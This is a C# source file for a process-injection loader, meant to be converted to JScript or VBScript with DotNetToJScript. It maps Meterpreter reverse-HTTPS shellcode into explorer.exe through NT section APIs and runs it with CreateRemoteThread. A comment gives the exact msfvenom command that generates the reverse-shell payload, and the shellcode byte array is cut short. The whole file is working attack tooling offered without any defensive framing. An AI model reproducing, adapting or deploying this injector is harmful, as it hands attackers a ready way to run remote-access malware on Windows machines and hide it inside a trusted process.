// Compile Command : DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript/VBScript --ver=v4 -o runner.js/vbs
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

[ComVisible(true)]
public class TestClass
{
    // OpenProcess - kernel32.dll
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    // CreateRemoteThread - kernel32.dll
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // ntdll.dll API functions : 
    // NtCreateSection
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern UInt32 NtCreateSection(
        ref IntPtr section,
        UInt32 desiredAccess,
        IntPtr pAttrs,
        ref long MaxSize,
        uint pageProt,
        uint allocationAttribs,
        IntPtr hFile);

    // NtMapViewOfSection
    [DllImport("ntdll.dll")]
    public static extern UInt32 NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        IntPtr CommitSize,
        ref long SectionOffset,
        ref long ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect);

    // NtUnmapViewOfSection
    [DllImport("ntdll.dll", SetLastError = true)]
    static extern uint NtUnmapViewOfSection(
        IntPtr hProc,
        IntPtr baseAddr);

    // NtClose
    [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
    static extern int NtClose(IntPtr hObject);
    public TestClass()
    {
        // Shellcode : sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp | tr -d '\n'
        byte[] buf = new byte[738] { 0xfc, 0x48, 0x83 ...};

        long buffer_size = buf.Length;

        // Create the section handle.
        IntPtr ptr_section_handle = IntPtr.Zero;
        UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

        if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
        {
            Console.WriteLine("[-] An error occurred while creating the section.");
        }

        Console.WriteLine("[+] The section has been created successfully.");
        Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));

        // Map a view of a section into the virtual address space of the current process.
        long local_section_offset = 0;
        IntPtr ptr_local_section_addr = IntPtr.Zero;
        UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, Process.GetCurrentProcess().Handle, ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

        if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
        {
            Console.WriteLine("[-] An error occurred while mapping the view within the local section.");
        }

        Console.WriteLine("[+] The local section view has been mapped successfully with PAGE_READWRITE access.");
        Console.WriteLine("[*] ptr_local_section_addr: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

        // Copy the shellcode into the mapped section.
        Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);

        // Map a view of the section in the virtual address space of the targeted process.
        var process = Process.GetProcessesByName("explorer")[0];
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, process.Id);
        IntPtr ptr_remote_section_addr = IntPtr.Zero;
        UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

        if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
        {
            Console.WriteLine("[-] An error occurred while mapping the view within the remote section.");
        }

        Console.WriteLine("[+] The remote section view has been mapped successfully with PAGE_EXECUTE_READ access.");
        Console.WriteLine("[*] ptr_remote_section_addr: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));

        // Unmap the view of the section from the current process & close the handle.
        NtUnmapViewOfSection(Process.GetCurrentProcess().Handle, ptr_local_section_addr);
        NtClose(ptr_section_handle);

        // Create a remote thread to execute the shellcode.
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}